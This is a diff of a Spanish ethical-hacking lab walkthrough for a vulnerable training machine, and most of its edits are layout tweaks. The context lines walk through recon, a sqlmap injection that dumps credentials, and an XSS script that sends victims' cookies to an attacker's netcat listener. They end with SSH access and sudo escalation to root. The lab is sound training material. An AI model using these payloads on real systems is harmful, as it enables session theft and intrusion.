@@ -22,11 +22,9 @@ Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como 
 $ sudo bash auto_deploy.sh soberbia.tar
 ----
 
-== Escenario final
+== Solucionar la máquina
 
 En esta máquina pondremos en práctica todos los conceptos aprendidos previamente. Será una prueba final diseñada para aplicar los conocimientos adquiridos. El objetivo es lograr la escalada de privilegios hasta obtener acceso como root, partiendo de un entorno que, aunque vulnerable, se asemeja a uno real. Será necesario realizar primero un reconocimiento, seguido de la ejecución de distintos tipos de ataques. Se fomenta la exploración libre, sin seguir guías preestablecidas; no obstante, proporcionaré algunas pistas para avanzar en caso de ser necesario.
-
-== Solucionar la máquina
 
 En esta guía se darán pistas, principalmente herramientas y cómo usarlas. Mucha suerte.
 
@@ -58,7 +56,7 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn (IP) -oG allPorts
 * *(IP)* -> La dirección IP del objetivo.
 * *-oG allPorts* -> Guarda los resultados en formato grepable (fácil de extraer con grep o awk) en el archivo allPorts.
 
-image::assets/recon/nmap/nmap.png[nmap,align=center]
+image::assets/recon/nmap/nmap.png[nmap,width=560,align=center]
 
 Como podemos ver están abiertos los puertos 80 y 22
 ====
@@ -78,7 +76,7 @@ nmap -p (PORTS) -sC -sV (IP)
 * *-sV* -> Hace una detección de versión: intenta identificar el software y su versión en cada puerto abierto (por ejemplo, Apache 2.4.57).
 * *(IP)* -> La dirección IP del objetivo.
 
-image::assets/recon/nmap/nmapVer.png[Versiones nmap,align=center]
+image::assets/recon/nmap/nmapVer.png[Versiones nmap,width=560,align=center]
 
 Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar.
 ====
@@ -108,6 +106,8 @@ Aparentemente se ve una página que no tiene nada, pero es muy posible que posea
 ----
 feroxbuster -u http://(IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --depth 0 --timeout 5
 ----
+
+<<<
 
 * *-u http://(IP)* -> Define la URL objetivo. Puedes sustituir (IP) por una dirección IP o dominio.
 * *-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt* -> Especifica el diccionario que se usará para generar las rutas a probar (en este caso, uno mediano del paquete de DirBuster).
@@ -144,6 +144,8 @@ Bueno, una vez conociendo la estructura, podemos apreciar que hay un directorio 
 image::assets/recon/web/pruebas.png[directorio pruebas,align=center]
 ====
 
+<<<
+
 .Pista 6
 [%collapsible]
 ====
@@ -160,7 +162,7 @@ image::assets/recon/web/wappalyzer.png[wappalyzer,align=center]
 whatweb -a 3 -v http://172.17.0.2/1/2/4/23/dev/pruebas/login.php
 ----
 
-image::assets/recon/web/whatweb.png[whatweb,align=center]
+image::assets/recon/web/whatweb.png[whatweb,width=540,align=center]
 ====
 
 === Ataque
@@ -210,7 +212,7 @@ sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=adm
 * *--dump* -> Si se encuentra una inyección válida, extraerá y mostrará automáticamente el contenido de las tablas de la base de datos.
 * *--batch* -> Ejecuta en modo automático, sin pedir confirmación para cada acción (muy útil en entornos automatizados o pruebas rápidas).
 
-image::assets/atacar/sqli/sqliattack.png[ataque sqli,align=center]
+image::assets/atacar/sqli/sqliattack.png[ataque sqli,width=640,align=center]
 
 Como podemos ver, hemos obtenido las credenciales de los usuarios admin y test, por lo que podremos pasar el login.
 ====
@@ -240,6 +242,8 @@ nc -lvpn 4444
 image::assets/atacar/xss/netcat1.png[comando netcat,align=center]
 ====
 
+<<<
+
 .Pista 12
 [%collapsible]
 ====
@@ -250,7 +254,7 @@ Después, dentro del comentario meteremos el siguiente script en javascript, que
 <script>fetch('http://(IP atacante):4444?cookie=' + encodeURIComponent(document.cookie));</script>
 ----
 
-image::assets/atacar/xss/xss.png[xss script,align=center]
+image::assets/atacar/xss/xss.png[xss script,width=520,align=center]
 
 Una vez enviado dicho script veremos una cadena muy larga en GET, ese es el contenido de la cookie:
 
@@ -262,7 +266,7 @@ image::assets/atacar/xss/netcat2.png[envio de cookies a netcat,align=center]
 ====
 Copiamos esta cadena y la decodificamos con *cyberchef*, una herramienta web muy util para estos casos. Usamos URL decode, para ver el contenido:
 
-image::assets/atacar/xss/cyberchef.png[cyberchef,align=center]
+image::assets/atacar/xss/cyberchef.png[cyberchef,width=520,align=center]
 ====
 
 .Pista 14
@@ -281,6 +285,8 @@ image::assets/atacar/xss/CrackPasswd.png[contraseña,align=center]
 Una vez hecho esto ya tendríamos las credenciales del ssh. 
 ====
 
+<<<
+
 .Sugerencia
 [%collapsible]
 ====
@@ -297,11 +303,11 @@ Con las credeciales ssh, nos conectamos al servidor:
 [%collapsible]
 ====
 
-image::assets/atacar/escalada/ssh.png[conexión con el servidor,align=center]
+image::assets/atacar/escalada/ssh.png[conexión con el servidor,width=450,align=center]
 
 Ahora veremos si tenemos algún privilegio:
 
-image::assets/atacar/escalada/sudo-l.png[comando sudo -l,align=center]
+image::assets/atacar/escalada/sudo-l.png[comando sudo -l,width=450,align=center]
 ====
 
 .Pista 16
@@ -324,7 +330,7 @@ image::assets/atacar/escalada/root.png[somos root,align=center]
 
 De esta forma hemos aprendido cómo funciona una máquina sencilla, con multiples vulnerabilidades, aprendiendo a usar herramientas reales y que normalmente se usan en estos entornos. Además hemos refrescado conocimientos y visto algunos de otra forma. Si queremos avanzar más en el mundo del hacking ético y aprender más recomiendo lo siguiente:
 
-* Conocerte bien, saber que rama quieres aprender, centrándote en atacar o en defender, es vital para luego hacer los certificados, ya que sabrás en cual encajas mejor.
+* Conocerte bien, saber qué rama quieres aprender, centrándote en atacar o en defender, es vital para luego hacer los certificados, ya que sabrás en cual encajas mejor.
 * Hacer muchas máquinas, esto ha sido un ensayo, donde hemos aprendido lo más básico, allí fuera en internet hay máquinas mucho más complejas y divertidas de explorar. Por ello recomiendo:
 ** https://tryhackme.com/[TryHackMe].
 ** https://www.hackthebox.com/[HackTheBox].
